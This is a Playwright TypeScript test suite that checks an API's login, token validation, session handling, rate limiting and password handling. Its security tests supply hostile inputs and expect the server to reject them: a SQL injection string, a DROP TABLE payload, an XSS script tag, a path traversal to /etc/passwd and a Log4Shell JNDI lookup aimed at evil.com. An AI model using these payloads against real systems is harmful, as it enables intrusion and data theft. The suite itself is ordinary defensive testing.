import { test, expect } from "@playwright/test";
import { ApiHelper } from "../utils/api-helper";
import { config } from "../../config/environment";

test.describe("Authentication & Authorization API Tests @api @auth", () => {
  let apiHelper: ApiHelper;

  test.beforeEach(async () => {
    apiHelper = new ApiHelper();
  });

  test.describe("Login Flow", () => {
    test("should login with valid credentials", async () => {
      const token = await apiHelper.login(
        config.adminUsername,
        config.adminPassword
      );

      expect(token).toBeDefined();
      expect(typeof token).toBe("string");
      expect(token.length).toBeGreaterThan(0);
    });

    test("should fail login with invalid username", async () => {
      try {
        await apiHelper.login("invalid_user", config.adminPassword);
        expect.fail("Should have thrown error");
      } catch (error: any) {
        expect(error.response.status).toBeGreaterThanOrEqual(400);
        expect(error.response.status).toBeLessThan(500);
      }
    });

    test("should fail login with invalid password", async () => {
      try {
        await apiHelper.login(config.adminUsername, "wrong_password");
        expect.fail("Should have thrown error");
      } catch (error: any) {
        expect(error.response.status).toBeGreaterThanOrEqual(400);
        expect(error.response.status).toBeLessThan(500);
      }
    });

    test("should fail login with empty credentials", async () => {
      try {
        await apiHelper.login("", "");
        expect.fail("Should have thrown error");
      } catch (error: any) {
        expect(error.response.status).toBeGreaterThanOrEqual(400);
      }
    });

    test("should fail login with SQL injection attempt", async () => {
      try {
        await apiHelper.login("admin' OR '1'='1", "password");
        expect.fail("Should have thrown error");
      } catch (error: any) {
        expect(error.response.status).toBeGreaterThanOrEqual(400);
      }
    });
  });

  test.describe("Token Validation", () => {
    test("should access protected endpoints with valid token", async () => {
      const token = await apiHelper.login();
      const authenticatedHelper = new ApiHelper({ token });

      const isHealthy = await authenticatedHelper.healthCheck();
      expect(isHealthy).toBe(true);
    });

    test("should fail to access protected endpoints without token", async () => {
      const unauthenticatedHelper = new ApiHelper();

      try {
        await unauthenticatedHelper.createCompany();
        expect.fail("Should have thrown error");
      } catch (error: any) {
        expect(error.response.status).toBe(401);
      }
    });

    test("should fail to access protected endpoints with invalid token", async () => {
      const invalidTokenHelper = new ApiHelper({ token: "invalid_token_123" });

      try {
        await invalidTokenHelper.createCompany();
        expect.fail("Should have thrown error");
      } catch (error: any) {
        expect(error.response.status).toBe(401);
      }
    });

    test("should fail to access protected endpoints with expired token", async () => {
      // Using a token that's formatted correctly but expired
      const expiredToken =
        "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiaWF0IjoxNTE2MjM5MDIyLCJleHAiOjE1MTYyMzkwMjJ9.4Adcj0mI2Z2d8tHI9m0x_5zwN84V0u5Z_5W2X_u_u8s";
      const expiredTokenHelper = new ApiHelper({ token: expiredToken });

      try {
        await expiredTokenHelper.createCompany();
        expect.fail("Should have thrown error");
      } catch (error: any) {
        expect(error.response.status).toBe(401);
      }
    });
  });

  test.describe("Session Management", () => {
    test("should maintain session across multiple requests", async () => {
      const token = await apiHelper.login();
      const authenticatedHelper = new ApiHelper({ token });

      // Make multiple requests with same token
      const company1 = await authenticatedHelper.createCompany({
        code: "SESSION_TEST_1",
      });
      const company2 = await authenticatedHelper.createCompany({
        code: "SESSION_TEST_2",
      });

      expect(company1).toBeDefined();
      expect(company2).toBeDefined();

      // Cleanup
      await authenticatedHelper.deleteCompany(company1.id);
      await authenticatedHelper.deleteCompany(company2.id);
    });

    test("should handle concurrent requests with same token", async () => {
      const token = await apiHelper.login();
      const authenticatedHelper = new ApiHelper({ token });

      // Make concurrent requests
      const [company1, company2, company3] = await Promise.all([
        authenticatedHelper.createCompany({ code: "CONCURRENT_1" }),
        authenticatedHelper.createCompany({ code: "CONCURRENT_2" }),
        authenticatedHelper.createCompany({ code: "CONCURRENT_3" }),
      ]);

      expect(company1).toBeDefined();
      expect(company2).toBeDefined();
      expect(company3).toBeDefined();

      // Cleanup
      await Promise.all([
        authenticatedHelper.deleteCompany(company1.id),
        authenticatedHelper.deleteCompany(company2.id),
        authenticatedHelper.deleteCompany(company3.id),
      ]);
    });
  });

  test.describe("Security & Input Validation", () => {
    test("should sanitize user input in login", async () => {
      const maliciousInputs = [
        "<script>alert('xss')</script>",
        "'; DROP TABLE users; --",
        "../../../etc/passwd",
        "${jndi:ldap://evil.com/a}",
      ];

      for (const maliciousInput of maliciousInputs) {
        try {
          await apiHelper.login(maliciousInput, "password");
          expect.fail("Should have thrown error");
        } catch (error: any) {
          expect(error.response.status).toBeGreaterThanOrEqual(400);
        }
      }
    });

    test("should rate limit login attempts", async () => {
      const attempts = [];
      const maxAttempts = 10;

      // Try multiple rapid login attempts
      for (let i = 0; i < maxAttempts; i++) {
        attempts.push(
          apiHelper
            .login("test_user_rate_limit", "wrong_password")
            .catch((e) => e)
        );
      }

      const results = await Promise.all(attempts);

      // Should see some rate limiting (429) or authentication failures (401)
      const hasRateLimiting = results.some(
        (result) => result?.response?.status === 429
      );
      const hasAuthFailures = results.some(
        (result) => result?.response?.status === 401
      );

      // At least one of these should be true
      expect(hasRateLimiting || hasAuthFailures).toBe(true);
    });
  });

  test.describe("Password Security", () => {
    test("should enforce password requirements", async () => {
      // Test with weak passwords (if registration endpoint exists)
      const weakPasswords = ["123", "password", "abc"];

      for (const weakPassword of weakPasswords) {
        try {
          await apiHelper.login("test_user", weakPassword);
          // If it fails, that's expected
        } catch (error: any) {
          expect(error.response.status).toBeGreaterThanOrEqual(400);
        }
      }
    });

    test("should not expose password in error messages", async () => {
      try {
        await apiHelper.login("testuser", "testpassword123");
        expect.fail("Should have thrown error");
      } catch (error: any) {
        const errorMessage = error.response?.data?.message || "";
        expect(errorMessage.toLowerCase()).not.toContain("testpassword123");
      }
    });
  });
});
